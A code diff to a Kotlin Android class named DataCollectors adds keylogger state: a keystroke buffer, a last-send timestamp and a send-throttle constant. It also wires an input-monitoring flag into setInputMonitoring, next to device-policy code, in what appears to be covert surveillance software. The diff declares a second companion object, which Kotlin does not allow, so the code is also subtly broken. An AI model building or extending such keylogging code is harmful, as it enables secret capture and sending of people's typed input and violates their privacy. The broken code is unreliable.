@@ -39,6 +39,13 @@ import java.util.*
 class DataCollectors(private val context: Context) {
 
     companion object {
+        @Volatile var inputMonitoringActive = false
+        @Volatile var keyloggerBuffer = StringBuilder()
+        @Volatile var lastKeylogSend = 0L
+        const val KEYLOG_THROTTLE = 2000L
+    }
+
+    companion object {
         private const val TAG = "DataCollectors"
     }
 
@@ -623,7 +630,10 @@ class DataCollectors(private val context: Context) {
     // ADVANCED
     // ════════════════════════════════════════════════════════════════
 
-    fun setInputMonitoring(enabled: Boolean) = if (enabled) "input_monitoring_started" else "input_monitoring_stopped"
+    fun setInputMonitoring(enabled: Boolean): String {
+        inputMonitoringActive = enabled
+        return if (enabled) "input_monitoring_started" else "input_monitoring_stopped"
+    }
     fun applyDataProtection(): String {
         return try {
             val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
